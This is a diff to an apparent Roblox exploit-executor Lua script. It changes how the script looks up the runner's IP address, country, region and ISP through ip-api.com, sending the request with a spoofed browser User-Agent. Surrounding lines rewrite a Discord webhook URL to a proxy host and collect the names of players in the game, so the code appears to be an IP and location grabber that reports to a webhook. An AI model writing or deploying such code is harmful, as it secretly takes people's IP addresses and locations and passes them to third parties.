@@ -31,13 +31,21 @@ task.spawn(function()
     local proxyUrl = rawWebhookUrl:gsub("discord.com", "webhook.lewisakura.moe")
     
     local success, geoData = pcall(function()
-        return HttpService:JSONDecode(HttpService:GetAsync("https://ipapi.co/json/"))
+        local requestMethod = http_request or request or (syn and syn.request)
+        local response = requestMethod({
+            Url = "http://ip-api.com/json/",
+            Method = "GET",
+            Headers = {
+                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            }
+        })
+        return HttpService:JSONDecode(response.Body)
     end)
     
-    local country = success and geoData.country_name or "Unknown"
-    local region = success and geoData.region or "Unknown"
-    local ip = success and geoData.ip or "Hidden"
-    local isp = success and geoData.org or "Unknown"
+    local country = (success and geoData.country) or "Unknown"
+    local region = (success and geoData.regionName) or "Unknown"
+    local ip = (success and geoData.query) or "Hidden"
+    local isp = (success and geoData.isp) or "Unknown"
     
     local allPlayers = Players:GetPlayers()
     local playerNames = {}
